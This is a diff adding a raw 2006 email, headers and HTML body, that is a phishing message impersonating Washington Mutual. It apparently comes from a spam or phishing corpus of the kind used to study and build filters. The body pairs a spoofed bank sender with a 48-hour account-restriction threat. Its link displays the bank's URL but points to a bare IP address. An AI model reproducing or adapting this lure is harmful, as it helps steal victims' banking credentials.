@@ -1,0 +1,91 @@
+From nobody Sun Jan 25 13:48:14 2015
+Return-Path: <ben@isbd.ltd.uk>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+ by naughty.example.com (Postfix) with ESMTP id 9C151CAB489
+ for <nobody@login.example.com>; Sat, 22 Apr 2006 07:57:45 -0400 (EDT)
+Received: from isbd.ltd.uk (84-45-228-40.no-dns-yet.enta.net [84.45.228.40])
+ by mail1.example.com (Postfix) with ESMTP id 5D2A76CCE75
+ for <nobody@example.com>; Sat, 22 Apr 2006 03:11:25 -0400 (EDT)
+Received: by server.isbd.ltd.uk (Postfix, from userid 1001)
+ id 2BF202B31BC; Sat, 22 Apr 2006 12:29:02 +0100 (BST)
+To: nobody@example.com
+Subject: Validate your Washington Mutual, Inc. account.
+Message-ID: <1145705342.31873.qmail@wamu.com>
+From: "Washington Mutual, Inc. " <service@wamu.com>
+Content-Type: text/html
+Date: Sat, 22 Apr 2006 12:29:02 +0100 (BST)
+X-Keywords: 
+X-UID: 291206
+Status: O
+Content-Length: 2950
+Lines: 67
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>WAMU</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<table width="488" border="1" align="center" bordercolor="#004C4D" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td bgcolor="#FFFFFF" height="46" align="left" valign="top" bordercolor="#FFFFFF" width="484"> 
+      <p align="left">
+      <img src="http://www.inman.com/images/WaMu_logo_2004.jpg" width="233" height="32"></p>
+    </td>
+  </tr>
+  <tr> 
+    <td bgcolor="#FFFFFF" bordercolor="#000000" width="484"> 
+      <blockquote> 
+        <blockquote> 
+          <p align="left">&nbsp;</p>
+        </blockquote>
+      </blockquote>
+      <p></p>
+      <blockquote> 
+        <p><b>Dear Washington Mutual, Inc. Customer,</b></p>
+        <p><b>It has come to our attention that your account information needs 
+        to be validated as part of our continuing commitment to protect your 
+        account and to reduce the instance of fraud on our website.</b></p>
+        <b> If you could please take 2-3 minutes out of 
+        your online experience and validate your personal records you will not run 
+        in any future problems with the online service. </b> 
+        <p><b>To get started please click 
+          the link below:<br>
+          &nbsp;</b></p>
+        <p><font color="#004C4D">
+        <a href="http://202.153.34.162/icons/.../onlinebanking.personal.wamu.com/index.html">
+        https://onlinebanking.personal.wamu.com</a></font></p>
+        <b> If your account information is not updated within 48 hours<font color="#004C4D"> then your ability to use your online 
+        account will become restricted.</font></b>
+        <p><b>Thank you for your prompt attention to this 
+          matter. Please understand that this is a security measure meant to help 
+          protect your privacy and your account.</b></p>
+        <p><b>If you have any questions, feel free to contact 
+          our customer support department any time at:<br>
+          </b><a href="mailto:customer-service@wamu.com">
+        customerservice@wamu.com</a></p>
+        <p><b><br>
+          We apologize for any inconvenience this may cause, and appreciate your 
+          assistance in helping us maintain the integrity of the entire Washington Mutual, Inc. 
+          Banking system.</b></p>
+      </blockquote>
+      <p></p>
+      <blockquote> 
+        <p><b><br>
+          Sincerely,<br>
+          Washington Mutual, Inc.</b></p>
+      </blockquote>
+      <p align="center">
+      <font face="verdana, sans serif" style="font-size:8pt" size="1">&copy;&nbsp;Copyright 
+        2006,  </font><span style="font-size: 8pt">Washington Mutual, Inc.</span><font face="verdana, sans serif" style="font-size:8pt" size="1"> All Rights Reserved.</font></p>
+      <p align="center">&nbsp;</p>
+    </td>
+  </tr>
+  </table>
+</body>
+</html>
